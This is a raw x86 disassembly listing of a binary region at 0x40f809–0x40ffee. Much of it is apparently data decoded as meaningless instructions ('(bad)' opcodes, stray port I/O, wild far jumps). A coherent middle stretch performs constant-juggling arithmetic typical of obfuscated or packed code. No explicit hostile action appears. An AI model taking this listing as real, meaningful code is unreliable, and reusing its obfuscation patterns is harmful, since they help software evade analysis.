  40f809:	lea    esp,es:[esi+0x7f]
  40f80d:	pop    eax
  40f80e:	xchg   DWORD PTR [edx+0x3b],edx
  40f811:	inc    ecx
  40f812:	mov    ch,0x99
  40f814:	jno    0x40f7d8
  40f816:	sbb    eax,0xde78e67f
  40f81b:	data16 mov ah,0xa3
  40f81e:	xchg   DWORD PTR [esi+0x37],eax
  40f821:	imul   ebp,DWORD PTR [ecx-0x1f53788a],0x79170002
  40f82b:	jmp    0xb3fac1d6
  40f830:	sub    eax,0x35cb5876
  40f835:	or     eax,0x7fc2e44d
  40f83a:	jle    0x40f7bc
  40f83c:	dec    edx
  40f83d:	add    eax,0x3dfcd03e
  40f842:	stos   DWORD PTR es:[edi],eax
  40f843:	dec    edi
  40f844:	and    dl,BYTE PTR [ebx]
  40f846:	das    
  40f847:	mov    al,ds:0x3346fbfd
  40f84c:	inc    esp
  40f84d:	ins    BYTE PTR es:[edi],dx
  40f84e:	xchg   esp,eax
  40f84f:	pusha  
  40f850:	fwait
  40f851:	and    al,0x6b
  40f853:	or     ebx,eax
  40f855:	jbe    0x40f874
  40f857:	sub    ah,BYTE PTR [eax]
  40f859:	sub    DWORD PTR [ebx],ebp
  40f85b:	push   0x38c6bda3
  40f860:	mov    eax,DWORD PTR [ecx+ebp*1-0x7cd15dcb]
  40f867:	adc    dh,BYTE PTR [edx-0x74]
  40f86a:	pop    si
  40f86c:	mov    ds:0xad7a0bac,eax
  40f871:	mov    WORD PTR [ebp-0x57],?
  40f874:	or     ecx,ebx
  40f876:	fadd   QWORD PTR [eax]
  40f878:	or     eax,0x9201d3f
  40f87d:	xchg   ecx,eax
  40f87e:	retf   0x6c5d
  40f881:	mov    esp,0xf71c33fd
  40f886:	gs mov ch,0x76
  40f889:	scas   eax,DWORD PTR es:[edi]
  40f88a:	cmp    bh,al
  40f88c:	add    edi,DWORD PTR [esi-0x141aeed7]
  40f892:	push   0xffffffaf
  40f894:	retf   
  40f895:	stos   BYTE PTR es:[edi],al
  40f896:	push   esp
  40f897:	stc    
  40f898:	and    esp,ebp
  40f89a:	pop    ds
  40f89b:	pop    esp
  40f89c:	xchg   edi,eax
  40f89d:	inc    esp
  40f89e:	xchg   edx,eax
  40f89f:	lahf   
  40f8a0:	sub    DWORD PTR [ebp-0x5183629b],edi
  40f8a6:	xchg   ecx,eax
  40f8a7:	jp     0x40f91b
  40f8a9:	ds push esi
  40f8ab:	call   0xfef1966a
  40f8b0:	mov    ch,0x71
  40f8b2:	in     al,0xa2
  40f8b4:	neg    DWORD PTR [ecx]
  40f8b6:	mov    dh,0x72
  40f8b8:	adc    BYTE PTR [edi],0x9e
  40f8bb:	and    DWORD PTR [edi],esp
  40f8bd:	popa   
  40f8be:	mov    ch,0xed
  40f8c0:	div    DWORD PTR [ebx-0x41]
  40f8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c4:	adc    edx,DWORD PTR [ebx-0x6]
  40f8c7:	pop    ecx
  40f8c8:	dec    ebp
  40f8c9:	sbb    cl,BYTE PTR [ecx+esi*8+0x50ffb00e]
  40f8d0:	mov    edx,0xf42b4960
  40f8d5:	xchg   ebx,eax
  40f8d6:	adc    edx,ebx
  40f8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d9:	mov    eax,ds:0xb141516d
  40f8de:	dec    esi
  40f8df:	je     0x40f8dc
  40f8e1:	stc    
  40f8e2:	jle    0x40f8ba
  40f8e4:	(bad)  
  40f8e5:	xor    DWORD PTR [edx],ebx
  40f8e7:	jg     0x40f8fc
  40f8e9:	jmp    0xdacdd36d
  40f8ee:	pop    ss
  40f8ef:	xchg   esp,eax
  40f8f0:	jns    0x40f96b
  40f8f2:	sbb    ebp,DWORD PTR [edx+0x79]
  40f8f5:	mov    dh,0x51
  40f8f7:	or     BYTE PTR [esi-0x1a],ah
  40f8fa:	push   ecx
  40f8fb:	hlt    
  40f8fc:	in     eax,0x59
  40f8fe:	mov    bh,BYTE PTR [ecx+0x35]
  40f901:	pop    ebx
  40f902:	inc    esp
  40f903:	ficom  WORD PTR [edi]
  40f905:	xchg   ecx,eax
  40f906:	test   BYTE PTR [ecx+0x34],0xd0
  40f90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f90b:	hlt    
  40f90c:	repz jo 0x40f973
  40f90f:	or     BYTE PTR [edx+eiz*8-0x47d8e2c3],dl
  40f916:	mov    eax,0x71f89059
  40f91b:	in     al,dx
  40f91c:	mul    BYTE PTR [ebx+edx*8-0x302d7413]
  40f923:	mov    al,ds:0x73449c0e
  40f928:	mov    edi,0x72c39c85
  40f92d:	inc    ecx
  40f92e:	in     eax,0xa2
  40f930:	fdivr  QWORD PTR [edx]
  40f932:	jne    0x40f8d6
  40f934:	sbb    eax,0xb306efbc
  40f939:	xchg   ecx,eax
  40f93a:	lods   eax,DWORD PTR ds:[esi]
  40f93b:	inc    ebx
  40f93c:	and    eax,DWORD PTR [edi-0x5879179e]
  40f942:	xor    edx,esp
  40f944:	imul   ebp,DWORD PTR [ebx+edx*4-0x79],0xffffffcf
  40f949:	xor    edi,ecx
  40f94b:	pop    es
  40f94c:	shr    DWORD PTR [eax-0x4f3a925c],0x51
  40f953:	xor    BYTE PTR [edi+0x5],ah
  40f956:	mov    bl,0x15
  40f958:	out    0x18,eax
  40f95a:	pop    esi
  40f95b:	enter  0xb3cc,0xb7
  40f95f:	js     0x40f945
  40f961:	push   ds
  40f962:	lds    esi,FWORD PTR [eax]
  40f964:	xchg   BYTE PTR [edx-0x65],bh
  40f967:	mov    esp,0xd2632880
  40f96c:	into   
  40f96d:	jno    0x40f9c5
  40f96f:	sub    eax,0x1064c9ca
  40f974:	fstp   st(6)
  40f976:	xchg   esp,eax
  40f977:	mov    ebx,0x6bfd08ac
  40f97c:	mov    ecx,0xe3c54361
  40f981:	mov    bh,0x57
  40f983:	into   
  40f984:	test   al,0x5e
  40f986:	jp     0x40f935
  40f988:	data16 jge 0x40f9f0
  40f98b:	jecxz  0x40f95e
  40f98d:	sbb    BYTE PTR [ebp+0x755b336],dh
  40f993:	jmp    0x78deb800
  40f998:	cld    
  40f999:	lahf   
  40f99a:	jle    0x40f9d9
  40f99c:	ret    
  40f99d:	data16 cmp dl,BYTE PTR [ebp+0x1f]
  40f9a1:	popa   
  40f9a2:	push   0xe
  40f9a4:	iret   
  40f9a5:	ficom  DWORD PTR ds:0xfb7eaa6c
  40f9ab:	mov    eax,0x3349d5a9
  40f9b0:	cmp    BYTE PTR [edx-0x46c0585f],0xa5
  40f9b7:	and    dh,al
  40f9b9:	outs   dx,DWORD PTR ds:[esi]
  40f9ba:	rcr    DWORD PTR [esp-0x6818b221],1
  40f9c1:	or     ecx,DWORD PTR [eax-0x3]
  40f9c4:	popf   
  40f9c5:	add    DWORD PTR [eax-0x3],ecx
  40f9c8:	push   ecx
  40f9c9:	mov    edi,0x5734584
  40f9ce:	cmp    dl,BYTE PTR [edi-0x34]
  40f9d1:	ins    DWORD PTR es:[edi],dx
  40f9d2:	pop    ds
  40f9d3:	sub    edi,ebx
  40f9d5:	leave  
  40f9d6:	test   al,0x29
  40f9d8:	in     al,0xa4
  40f9da:	mov    ah,0x5c
  40f9dc:	pop    ebp
  40f9dd:	fist   WORD PTR [esi+edi*1-0x74]
  40f9e1:	xchg   edx,eax
  40f9e2:	sub    eax,ecx
  40f9e4:	xor    eax,0xc3e
  40f9e9:	mov    DWORD PTR [ebp-0x58],eax
  40f9ec:	mov    DWORD PTR [ebp-0x14],0x66bd
  40f9f3:	pop    ecx
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x42202e
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp+0x57e17c70]
  40fc87:	stos   BYTE PTR es:[edi],al
  40fc88:	jbe    0x40fc28
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xf1181814
  40fc91:	ds adc eax,0xb0b6af27
  40fc97:	push   es
  40fc98:	ror    ebp,1
  40fc9a:	jbe    0x40fc41
  40fc9c:	retf   0x8ee0
  40fc9f:	loope  0x40fc57
  40fca1:	inc    ebx
  40fca2:	xchg   dl,ah
  40fca4:	stos   DWORD PTR es:[edi],eax
  40fca5:	fnstsw WORD PTR [eax*2-0x6ad8be68]
  40fcac:	ja     0x40fc57
  40fcae:	nop
  40fcaf:	hlt    
  40fcb0:	xlat   BYTE PTR ds:[ebx]
  40fcb1:	stos   DWORD PTR es:[edi],eax
  40fcb2:	or     esp,ecx
  40fcb4:	stos   DWORD PTR es:[edi],eax
  40fcb5:	push   ds
  40fcb6:	mov    dl,0x2b
  40fcb8:	pop    ecx
  40fcb9:	inc    ebx
  40fcba:	imul   edi,DWORD PTR [esi+0x62],0x884c143d
  40fcc1:	loopne 0x40fd3f
  40fcc3:	lock cld 
  40fcc5:	cmp    cl,bh
  40fcc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc8:	or     DWORD PTR [ecx+0x1],edi
  40fccb:	dec    ecx
  40fccc:	ja     0x40fca4
  40fcce:	xlat   BYTE PTR ds:[ebx]
  40fccf:	cmp    BYTE PTR [ebx-0x385949ef],ah
  40fcd5:	stos   DWORD PTR es:[edi],eax
  40fcd6:	inc    edi
  40fcd7:	mov    ecx,0x6f662609
  40fcdc:	inc    ecx
  40fcdd:	mov    bl,BYTE PTR [esi+0x33]
  40fce0:	rcl    ebp,1
  40fce2:	xlat   BYTE PTR ds:[ebx]
  40fce3:	mov    ebp,0x759a12e0
  40fce8:	rcl    DWORD PTR [esi],cl
  40fcea:	cmp    eax,0x9599663f
  40fcef:	imul   edx,DWORD PTR ds:0xa9202eed,0xcba38a22
  40fcf9:	mov    BYTE PTR [ecx+0x4f838ef0],ch
  40fcff:	aam    0x29
  40fd01:	cld    
  40fd02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd03:	in     al,dx
  40fd04:	xor    ecx,DWORD PTR [ecx+0x37]
  40fd07:	mov    al,ds:0xa1241045
  40fd0c:	jae    0x40fcfb
  40fd0e:	add    al,0xa
  40fd10:	mov    eax,ds:0x5b586c68
  40fd15:	outs   dx,BYTE PTR ds:[esi]
  40fd16:	inc    ebp
  40fd17:	imul   edi,DWORD PTR [esi+0x1c972234],0xffffffa8
  40fd1e:	xchg   ecx,esi
  40fd20:	mov    eax,0xb3bd45a4
  40fd25:	in     al,0x65
  40fd27:	es jae 0x40fd9f
  40fd2a:	dec    edi
  40fd2b:	or     BYTE PTR [eax],cl
  40fd2d:	and    eax,0x1abfd707
  40fd32:	jg     0x40fd9f
  40fd34:	dec    ebx
  40fd35:	stc    
  40fd36:	popf   
  40fd37:	out    0xcf,eax
  40fd39:	dec    edi
  40fd3a:	add    al,0x3
  40fd3c:	sbb    ecx,DWORD PTR [ecx]
  40fd3e:	sbb    eax,0x20c5330e
  40fd43:	xchg   edx,eax
  40fd44:	mov    bh,0xa4
  40fd46:	sbb    bl,BYTE PTR [ecx+0x14602ab4]
  40fd4c:	ds popf 
  40fd4e:	cdq    
  40fd4f:	xchg   BYTE PTR [esi],ah
  40fd51:	xlat   BYTE PTR ds:[ebx]
  40fd52:	pop    ds
  40fd53:	sar    BYTE PTR [edx+0x6e],0x12
  40fd57:	imul   ebp,DWORD PTR [ecx-0x1a],0x73
  40fd5b:	outs   dx,BYTE PTR ds:[si]
  40fd5d:	mov    BYTE PTR [edx],bl
  40fd5f:	jmp    0x40fd27
  40fd61:	and    eax,0xa884db65
  40fd66:	mov    al,0x6c
  40fd68:	inc    edi
  40fd69:	scas   eax,DWORD PTR es:[edi]
  40fd6a:	fcom   DWORD PTR ss:[ebp+0x348916f]
  40fd71:	mov    bh,0x15
  40fd73:	ror    BYTE PTR [esi+ecx*4+0x7079b20f],cl
  40fd7a:	repnz sub eax,0xe9fa0bff
  40fd80:	xchg   edi,eax
  40fd81:	addr16 pop ds
  40fd83:	loopne 0x40fd18
  40fd85:	mov    ah,0x8d
  40fd87:	repz adc ch,BYTE PTR [ecx+0x4d]
  40fd8b:	push   esp
  40fd8c:	adc    ch,dl
  40fd8e:	pusha  
  40fd8f:	inc    edx
  40fd90:	pop    ecx
  40fd91:	push   edx
  40fd92:	(bad)  
  40fd93:	sar    BYTE PTR [edi+0x74],1
  40fd96:	mov    eax,0xa1ee5cea
  40fd9b:	mov    ah,0xa5
  40fd9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd9e:	adc    sp,0xc5e9
  40fda3:	lds    esi,FWORD PTR [ebx]
  40fda5:	sbb    BYTE PTR [ecx],bl
  40fda7:	xor    BYTE PTR [edx+0x594467e7],ch
  40fdad:	mov    eax,ds:0x7aba886d
  40fdb2:	cmp    al,0x63
  40fdb4:	pop    esp
  40fdb5:	jecxz  0x40fd8a
  40fdb7:	push   cs
  40fdb8:	pop    edx
  40fdb9:	(bad)  
  40fdba:	loop   0x40fd4b
  40fdbc:	ja     0x40fda9
  40fdbe:	dec    ebx
  40fdbf:	xchg   ebp,eax
  40fdc0:	dec    ecx
  40fdc1:	mov    ch,0xef
  40fdc3:	mov    al,ds:0x1269bc00
  40fdc8:	and    eax,0x23f68c6
  40fdcd:	dec    eax
  40fdce:	hlt    
  40fdcf:	aaa    
  40fdd0:	dec    ebp
  40fdd1:	cmc    
  40fdd2:	add    ah,BYTE PTR [ebp+0x74b7bea3]
  40fdd8:	out    dx,eax
  40fdd9:	div    DWORD PTR [eax+eiz*8+0x27]
  40fddd:	mov    esi,0xb3ce4757
  40fde2:	ss stos DWORD PTR es:[edi],eax
  40fde4:	pop    esi
  40fde5:	jmp    0xba751bd9
  40fdea:	(bad)  
  40fdeb:	jp     0x40fe46
  40fded:	data16 setae bl
  40fdf1:	xchg   ebp,eax
  40fdf2:	rcl    BYTE PTR [ebx],1
  40fdf4:	add    eax,0x8d20a23
  40fdf9:	push   es
  40fdfa:	xchg   edx,eax
  40fdfb:	dec    ebp
  40fdfc:	xor    BYTE PTR [ecx],ch
  40fdfe:	push   ss
  40fdff:	pop    ebx
  40fe00:	cdq    
  40fe01:	cmp    bl,BYTE PTR [esi+0x168482a2]
  40fe07:	xchg   esi,eax
  40fe08:	jmp    0x40fda9
  40fe0a:	out    dx,eax
  40fe0b:	pop    eax
  40fe0c:	leave  
  40fe0d:	pop    ecx
  40fe0e:	push   esi
  40fe0f:	adc    DWORD PTR [ebp+eax*4-0x3e2b8442],ebx
  40fe16:	fwait
  40fe17:	cmp    BYTE PTR [edi-0x7f],dh
  40fe1a:	das    
  40fe1b:	inc    esi
  40fe1c:	iret   
  40fe1d:	in     eax,0x20
  40fe1f:	cmp    al,0x40
  40fe21:	xor    bl,BYTE PTR [edi]
  40fe23:	mov    eax,ds:0x9348f415
  40fe28:	out    dx,eax
  40fe29:	(bad)
  40fe2d:	sbb    BYTE PTR [ebx-0x783946a3],dl
  40fe33:	int3   
  40fe34:	or     dl,bl
  40fe36:	in     al,dx
  40fe37:	xor    al,0x1e
  40fe39:	(bad)  
  40fe3a:	jo     0x40fe53
  40fe3c:	shr    DWORD PTR [ebp-0x19],0xc1
  40fe40:	push   edi
  40fe41:	fwait
  40fe42:	jmp    0x86cd8219
  40fe47:	mov    dl,0x8d
  40fe49:	mov    ah,BYTE PTR [edx+0x6923c757]
  40fe4f:	es dec ecx
  40fe51:	dec    eax
  40fe52:	xchg   edx,eax
  40fe53:	and    ebx,DWORD PTR [ecx+0x2f]
  40fe56:	jns    0x40fe30
  40fe58:	push   ebp
  40fe59:	dec    ebp
  40fe5a:	loopne 0x40fe71
  40fe5c:	jae    0x40fe50
  40fe5e:	out    0x70,eax
  40fe60:	add    edx,DWORD PTR [eax-0x4c5564ab]
  40fe66:	(bad)  
  40fe67:	push   edi
  40fe68:	mov    edx,0x8ea8177e
  40fe6d:	and    al,0x8d
  40fe6f:	sbb    eax,0x9bf2fd16
  40fe74:	pop    edx
  40fe75:	and    BYTE PTR [ecx+ecx*8],bl
  40fe78:	add    bh,0x79
  40fe7b:	cld    
  40fe7c:	daa    
  40fe7d:	sub    BYTE PTR [edx],dh
  40fe7f:	push   edi
  40fe80:	jmp    0x40fee6
  40fe82:	jns    0x40fec2
  40fe84:	or     DWORD PTR [esi-0x1b],esp
  40fe87:	ss into 
  40fe89:	dec    edx
  40fe8a:	mov    edx,0xaf92642f
  40fe8f:	dec    di
  40fe91:	xor    BYTE PTR [eax+0x14],bl
  40fe94:	pop    ebx
  40fe95:	out    0xfd,al
  40fe97:	pop    edi
  40fe98:	test   al,0xe2
  40fe9a:	enter  0xd716,0x42
  40fe9e:	sub    DWORD PTR [ebx+0x24],edi
  40fea1:	in     eax,0xd9
  40fea3:	lds    edi,FWORD PTR [esi+esi*2+0x639d2047]
  40feaa:	imul   ebp,DWORD PTR [edi+0x3e],0x37
  40feae:	mov    bh,BYTE PTR [edx]
  40feb0:	adc    bl,BYTE PTR [ebp-0xb]
  40feb3:	in     eax,dx
  40feb4:	inc    eax
  40feb5:	bound  ebx,QWORD PTR [esi]
  40feb7:	es jmp 0x1cdd:0x2a1b5909
  40febf:	or     eax,0xca427059
  40fec4:	bound  eax,QWORD PTR [ecx]
  40fec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fec7:	inc    ebx
  40fec8:	xchg   edi,eax
  40fec9:	pop    eax
  40feca:	jge    0x40ff44
  40fecc:	pop    ds
  40fecd:	cdq    
  40fece:	jbe    0x40fee4
  40fed0:	add    esp,DWORD PTR [edx+0x65]
  40fed3:	xor    al,BYTE PTR [ecx]
  40fed5:	mov    dl,0x6a
  40fed7:	fwait
  40fed8:	sti    
  40fed9:	mov    al,ds:0x8c62e250
  40fede:	mov    cl,0xf6
  40fee0:	lods   eax,DWORD PTR ds:[esi]
  40fee1:	daa    
  40fee2:	bound  ecx,QWORD PTR [ebp+esi*1+0x3b35eb6]
  40fee9:	mov    bh,0xfd
  40feeb:	repz jge 0x40ff65
  40feee:	xchg   edi,eax
  40feef:	adc    DWORD PTR [edx-0x7d74f69c],ebx
  40fef5:	outs   dx,DWORD PTR ds:[esi]
  40fef6:	loopne 0x40fe9b
  40fef8:	add    al,0xcc
  40fefa:	xchg   esi,eax
  40fefb:	imul   DWORD PTR [eax-0x17ba2c0a]
  40ff01:	sahf   
  40ff02:	xlat   BYTE PTR ds:[ebx]
  40ff03:	xchg   DWORD PTR [edx-0x1f],ebp
  40ff06:	lock mov al,ds:0xbc9e6d4d
  40ff0c:	xor    esp,DWORD PTR [ebp-0x412b6ee]
  40ff12:	xchg   ebp,eax
  40ff13:	fldl2e 
  40ff15:	jl     0x40ff72
  40ff17:	cmc    
  40ff18:	loope  0x40ff65
  40ff1a:	inc    esi
  40ff1b:	outs   dx,DWORD PTR ds:[esi]
  40ff1c:	cwde   
  40ff1d:	fisubr DWORD PTR [esp+eiz*2-0x66709252]
  40ff24:	or     al,0x9d
  40ff26:	or     DWORD PTR [edx+0x637ebb52],edx
  40ff2c:	das    
  40ff2d:	jp     0x40fedd
  40ff2f:	lods   al,BYTE PTR ds:[esi]
  40ff30:	iret   
  40ff31:	pop    es
  40ff32:	in     eax,dx
  40ff33:	mov    esi,0xe451640b
  40ff38:	mov    bl,0xbc
  40ff3a:	retf   
  40ff3b:	ss pop ds
  40ff3d:	cs ins DWORD PTR es:[edi],dx
  40ff3f:	xor    DWORD PTR [ebx+0x5],0x1
  40ff43:	cmp    DWORD PTR [eax],eax
  40ff45:	add    BYTE PTR ds:0x40c2,dh
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x6d7c73b9]
  40ff68:	xchg   esp,eax
  40ff69:	mov    cl,0xb0
  40ff6b:	sbb    eax,0xbe181898
  40ff70:	adc    al,0x18
  40ff72:	sbb    BYTE PTR [eax],dh
  40ff74:	jmp    0x8aab:0x7c45316e
  40ff7b:	punpckhwd xmm6,XMMWORD PTR [ebp-0x2c]
  40ff80:	scas   al,BYTE PTR es:[edi]
  40ff81:	mov    eax,ds:0xaa3f148b
  40ff86:	pop    edx
  40ff87:	scas   eax,DWORD PTR es:[edi]
  40ff88:	lea    esp,[edx]
  40ff8a:	sar    ch,cl
  40ff8c:	fisubr WORD PTR [esp+ebx*1-0x22]
  40ff90:	scas   al,BYTE PTR es:[edi]
  40ff91:	mov    cl,0xe8
  40ff93:	pop    ebx
  40ff94:	ret    0x7b3c
  40ff97:	in     eax,dx
  40ff98:	lods   al,BYTE PTR ds:[esi]
  40ff99:	dec    edx
  40ff9a:	dec    bp
  40ff9c:	adc    bh,BYTE PTR [ebp+0x2e62508]
  40ffa2:	mov    ah,0xfb
  40ffa4:	push   ds
  40ffa5:	fs retf 0x9df8
  40ffa9:	repnz sbb edx,edx
  40ffac:	add    al,0x93
  40ffae:	xchg   BYTE PTR [ebp+0x306960b9],dh
  40ffb4:	and    al,BYTE PTR [edx+ecx*8]
  40ffb7:	(bad)  [eax]
  40ffb9:	mov    BYTE PTR [ebp+0x29dc439b],dl
  40ffbf:	push   edx
  40ffc0:	enter  0xd53c,0xa6
  40ffc4:	sub    DWORD PTR [ebp-0x76],esp
  40ffc7:	xor    al,0xd7
  40ffc9:	and    al,0xdc
  40ffcb:	scas   eax,DWORD PTR es:[edi]
  40ffcc:	add    edi,DWORD PTR [edx+0x67f02491]
  40ffd2:	mov    ebx,0x370ff69b
  40ffd7:	mov    edi,eax
  40ffd9:	mov    ds:0xbbf74e81,eax
  40ffde:	ror    ecx,1
  40ffe0:	add    al,ch
  40ffe2:	xor    BYTE PTR [esi-0x9],0x8d
  40ffe6:	push   0xffffffa4
  40ffe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe9:	sbb    DWORD PTR [edi],edi
  40ffeb:	xchg   esp,eax
  40ffec:	jns    0x410029
  40ffee:	punpckhwd mm2,QWORD PTR [eax]
